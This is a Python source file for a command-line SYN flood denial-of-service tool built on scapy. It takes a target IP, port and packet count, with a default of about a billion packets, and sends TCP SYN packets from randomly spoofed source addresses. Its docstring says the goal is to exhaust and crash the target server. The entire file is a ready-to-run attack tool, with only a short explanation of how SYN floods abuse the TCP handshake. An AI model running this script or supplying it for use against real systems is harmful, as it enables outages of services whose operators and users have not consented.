## SYN Flood attack program. Sends overwhelming amount of SYN packets to target IP from spoofed IPs
import argparse, random
from tqdm import tqdm
from termcolor import colored
from scapy.all import send, IP, TCP
'''
Script to execute a DdOS SYN flood attack on a target IP. SYN Floods work by abusing the 3way handshake.
About 1 billion SYN packets are sent from randomly spoofed IPs, causing the target server to use up all its resources sending SYN ACK packets that will never be acknowledged.
Thus leaving the handshake(s) uncompleted and crashing the server.
'''

DEFAULT_PACKETS = 999999999
DEFAULT_PORT = 80
MAX_PORTS = 65535

def random_IP():
    return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def get_args():
    parser = argparse.ArgumentParser(description='SYN Flooder\n')
    parser.add_argument('t', help='Target IP Address')
    parser.add_argument('-p', '--port', type=int, help="Target Port (default port 80)", default=DEFAULT_PORT)
    parser.add_argument('-a', '--amount', type=int, help='Amount of packets to send to target', default=DEFAULT_PACKETS)
    args = parser.parse_args()
    return args.t, args.port, args.amount

def SYN_FLOOD(target_ip, dPort, packets_to_send):
    print(colored("[-_] Sending SYN packets to target...", 'yellow'))
    for _ in tqdm(range(packets_to_send)):
        seq_n = random.randint(0, MAX_PORTS)
        sPort = random.randint(0, MAX_PORTS)
        Window = random.randint(0, MAX_PORTS)
        source_ip = random_IP()
        packet = IP(dst=target_ip, src=source_ip)/TCP(sport=sPort, dport=dPort, flags='S', seq=seq_n, window=Window)
        send(packet, verbose=False)
            
    print(colored('[+] All Packets Sent - Attack Complete.', 'green'))

def mainloop():
    Target_IP, dPort, packets_to_send = get_args()
    SYN_FLOOD(Target_IP, dPort, packets_to_send)
    
if __name__ == '__main__':
    mainloop()
